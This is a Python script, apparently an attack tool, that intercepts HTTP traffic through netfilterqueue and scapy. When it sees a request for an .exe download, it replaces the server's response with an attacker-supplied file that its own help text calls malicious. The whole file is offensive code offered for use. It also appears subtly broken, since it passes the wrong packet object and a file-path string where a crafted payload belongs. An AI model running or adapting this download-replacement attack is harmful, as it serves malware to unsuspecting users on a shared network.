# Imports
import optparse
import netfilterqueue
import scapy.all as scapy

# Acknowledgement List
ack_list = []


# Getting Arguments from CLI
def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-f", "--file", dest="file", help="Specify Malicious File")

    (options, arguments) = parser.parse_args()

    if not options.file:
        parser.error("[-] Please specify the malicious file. Use --help for more info.")

    return options


# Set Load
def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


# Process Packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load.decode():
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(packet, file)

                packet.set_payload(bytes(modified_packet))

    # Forwarding the packet
    packet.accept()


# Storing Malicious File from CLI
args = get_args()
file = args.file

# Creating Queue
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

# Running the Queue
queue.run()
